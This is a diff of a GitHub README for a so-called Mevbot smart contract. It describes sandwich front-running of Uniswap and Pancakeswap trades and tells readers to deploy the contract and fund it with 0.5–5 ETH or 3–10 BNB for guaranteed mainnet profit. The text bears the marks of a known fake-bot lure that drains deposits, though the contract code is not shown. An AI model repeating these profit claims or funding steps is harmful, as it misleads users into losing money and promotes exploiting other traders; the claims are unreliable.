@@ -1,13 +1,6 @@
 ![Uniswap Mevbot](https://github.com/patrickstrong/mevbot/blob/main/mevbot-banner-tutorial.jpeg)
 
-# Update Mevbot V2 with Update mempool May 2023 (5 seconds faster than other bots)
-
-1. Required to verify the contract on etherscan or bscscan. [READ THIS GUIDE](https://blog.chain.link/how-to-verify-a-smart-contract-on-etherscan/)
-2. Minimum contract balance **0.5 (WETH) and 3 (WBNB)** - no need to convert, just need to use the start function and send ETH according to the instructions above, the smart contract will automatically convert **ETH/BNB** to **WETH/WBNB**.
-3. ***IMPORTANT!*** Withdrawing the remaining balance, the contract must have ETH to pay the Gas fee.
-4. If the contract will no longer be used, please use the ***"emergencyOnly"*** function to withdraw all remaining balance from the contract to the wallet.
-
-This contract is not ***UNAUDITED***, so it is recommended to try it on the ***TESTNET*** network first. But you need to know that if you run a contract on the testnet, you can only receive and send ETH from wallet to contract and vice versa without any profit. 
+> This contract is not ***UNAUDITED***, so it is recommended to try it on the ***TESTNET*** network first. But you need to know that if you run a contract on the testnet, you can only receive and send ETH from wallet to contract and vice versa without any profit. 
 Because the algorithm that the contract uses is only for Mainnet.
 
 # Mevbot Smartcontract for Uniswap (v2/v3) & Pancakeswap (v2/v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 
@@ -76,7 +69,7 @@ How exactly does the attacker gain revenues during the process? Here is an examp
 
 Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.
 
-# How to implement mevbot with a smart contract on the Ethereum blockchain ?
+# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?
 
 1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)
 
@@ -96,6 +89,6 @@ Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas f
 
 I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.
 
-If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [JaredFromSubway MevBot](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
+If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
 
 To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.
